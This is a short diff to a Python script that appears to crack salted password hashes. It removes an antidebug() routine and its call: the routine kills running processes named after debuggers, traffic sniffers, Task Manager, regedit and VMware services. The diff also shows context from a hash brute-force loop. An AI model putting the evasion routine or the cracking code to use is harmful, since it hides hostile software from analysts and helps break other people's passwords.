@@ -1,4 +1,4 @@
-import asyncio, colorama, shutil, os, time, hashlib, json, psutil
+import asyncio, shutil, os, time, hashlib, json, psutil
 from colorama import Fore
 from websockets import connect
 from pwinput import pwinput
@@ -68,28 +68,6 @@ def bruteforce(hash, salt, uuid:str=None):
             if final == hash:
                 return word
     return hash
-
-def antidebug():
-        procesos = [
-            "httpdebuggerui",
-            "wireshark",
-            "fiddler",
-            "regedit",
-            "taskmgr",
-            "pestudio",
-            "vmwareuser",
-            "vgauthservice",
-            "vmacthlp",
-            "x96dbg",
-            "vmsrvc",
-            "x32dbg",
-            "vmusrvc"
-        ]
-        for proceso in psutil.process_iter():
-            if proceso.name() in procesos:
-                try:
-                    proceso.kill()
-                except: pass
 
 # CODE
 
@@ -221,7 +199,6 @@ def main():
 
 ## LOGIN
 
-antidebug()
 os.system("cls || clear")
 print(Fore.RED)
 printcenter(logo)
